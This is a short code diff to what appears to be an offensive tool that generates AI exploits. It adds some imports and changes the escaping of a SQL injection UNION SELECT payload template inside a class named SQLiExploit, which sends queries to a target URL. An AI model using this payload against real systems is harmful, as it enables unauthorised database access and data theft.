@@ -3,6 +3,13 @@ HexStrike Command Execution — enhanced executor + AI exploit gen + vuln correl
 """
 from __future__ import annotations
 
+# ── Auto-patched imports (F821 cleanup) ─────────────────────
+from visual_engine import ModernVisualEngine
+from process_management import ProcessManager
+import base64
+from monitoring import telemetry
+import traceback
+
 import logging
 import os
 import re
@@ -669,7 +676,7 @@ class SQLiExploit:
         results = {{}}
         
         for info_type, query in queries.items():
-            payload = f"1' UNION SELECT 1,({query}),3--"
+            payload = f"1' UNION SELECT 1,({{query}}),3--"
             try:
                 response = self.session.get(
                     f"{{self.target_url}}{{self.endpoint}}",
